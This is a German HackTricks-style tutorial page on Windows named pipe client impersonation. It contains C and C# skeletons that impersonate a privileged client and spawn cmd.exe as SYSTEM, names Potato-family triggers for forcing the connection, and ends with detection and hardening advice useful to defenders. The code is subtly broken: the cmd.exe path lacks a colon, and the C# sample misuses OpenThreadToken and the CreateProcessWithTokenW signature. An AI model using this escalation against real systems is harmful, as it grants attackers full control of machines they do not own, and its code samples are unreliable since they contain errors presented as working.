# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation ist ein lokales Privilege-Escalation-Primitiv, das es einem named-pipe-Server-Thread erlaubt, den Sicherheitskontext eines Clients anzunehmen, der sich mit ihm verbindet. In der Praxis kann ein Angreifer, der Code mit SeImpersonatePrivilege ausführen kann, einen privilegierten Client (z. B. einen SYSTEM-Dienst) dazu zwingen, sich mit einer vom Angreifer kontrollierten Pipe zu verbinden, ImpersonateNamedPipeClient aufzurufen, das resultierende Token in ein primäres Token zu duplizieren und einen Prozess als der Client zu starten (häufig NT AUTHORITY\SYSTEM).

Diese Seite konzentriert sich auf die Kerntechnik. Für End-to-End-Exploit-Ketten, die SYSTEM dazu zwingen, sich mit deiner Pipe zu verbinden, siehe die Potato family Seiten weiter unten.

## TL;DR
- Erstelle eine named pipe: \\.\pipe\<random> und warte auf eine Verbindung.
- Bring eine privilegierte Komponente dazu, sich damit zu verbinden (spooler/DCOM/EFSRPC/etc.).
- Lies mindestens eine Nachricht aus der Pipe, dann rufe ImpersonateNamedPipeClient auf.
- Öffne das Impersonation-Token des aktuellen Threads, DuplicateTokenEx(TokenPrimary) und CreateProcessWithTokenW/CreateProcessAsUser, um einen SYSTEM-Prozess zu starten.

## Requirements and key APIs
- Privilegien, die typischerweise vom aufrufenden Prozess/Thread benötigt werden:
- SeImpersonatePrivilege, um erfolgreich einen verbindenden Client zu impersonieren und CreateProcessWithTokenW zu verwenden.
- Alternativ kannst du, nachdem du SYSTEM impersoniert hast, CreateProcessAsUser verwenden, was SeAssignPrimaryTokenPrivilege und SeIncreaseQuotaPrivilege erfordern kann (diese sind erfüllt, wenn du SYSTEM impersonierst).
- Wesentliche verwendete APIs:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (es muss mindestens eine Nachricht gelesen werden, bevor die Impersonation erfolgt)
- ImpersonateNamedPipeClient und RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW oder CreateProcessAsUser
- Impersonation-Level: Um lokal nützliche Aktionen durchzuführen, muss der Client SecurityImpersonation erlauben (Standard für viele lokale RPC/named-pipe-Clients). Clients können dies beim Öffnen der Pipe mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION herabsetzen.

## Minimaler Win32-Workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Hinweise:
- Wenn ImpersonateNamedPipeClient ERROR_CANNOT_IMPERSONATE (1368) zurückgibt, stelle sicher, dass du zuerst aus der Pipe liest und dass der Client impersonation nicht auf das Identification level beschränkt hat.
- Bevorzuge DuplicateTokenEx mit SecurityImpersonation und TokenPrimary, um ein primary token zu erstellen, das für die Prozess-Erstellung geeignet ist.

## .NET Kurzbeispiel
In .NET kann NamedPipeServerStream via RunAsClient impersonate. Sobald impersonating aktiv ist, dupliziere das Thread-Token und erstelle einen Prozess.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Häufige Auslöser/Erzwingungen, damit SYSTEM sich mit Ihrer named pipe verbindet
Diese Techniken zwingen privilegierte Services dazu, sich mit Ihrer named pipe zu verbinden, damit Sie sie impersonate können:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Fehlerbehebung und Stolperfallen
- Sie müssen mindestens eine Nachricht aus der pipe lesen, bevor Sie ImpersonateNamedPipeClient aufrufen; andernfalls erhalten Sie ERROR_CANNOT_IMPERSONATE (1368).
- Wenn der Client mit SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION verbindet, kann sich der Server nicht vollständig impersonate; prüfen Sie das Impersonation-Level des Tokens via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW erfordert SeImpersonatePrivilege für den Aufrufer. Wenn das mit ERROR_PRIVILEGE_NOT_HELD (1314) fehlschlägt, verwenden Sie CreateProcessAsUser, nachdem Sie bereits SYSTEM impersonated haben.
- Stellen Sie sicher, dass der Security Descriptor Ihrer pipe dem Zielservice den Zugriff erlaubt, falls Sie ihn härten; standardmäßig sind pipes unter \\.\pipe entsprechend der DACL des Servers zugänglich.

## Erkennung und Härtung
- Überwachen Sie die Erstellung und Verbindungen von named pipes. Sysmon Event IDs 17 (Pipe Created) und 18 (Pipe Connected) sind nützlich, um legitime Pipe-Namen als Basislinie zu erfassen und ungewöhnliche, zufällig wirkende Pipes zu entdecken, die Token-Manipulationen vorausgehen.
- Achten Sie auf Sequenzen: Ein Prozess erstellt eine pipe, ein SYSTEM-Service verbindet sich, dann startet der erstellende Prozess ein Child als SYSTEM.
- Reduzieren Sie die Angriffsfläche, indem Sie SeImpersonatePrivilege von nicht notwendigen Service-Konten entfernen und unnötige Service-Logons mit hohen Rechten vermeiden.
- Defensive Entwicklung: Beim Verbinden zu untrusted named pipes geben Sie SECURITY_SQOS_PRESENT mit SECURITY_IDENTIFICATION an, um zu verhindern, dass Server den Client vollständig impersonate, sofern nicht notwendig.

## Referenzen
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (Walkthrough und Code-Beispiele). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
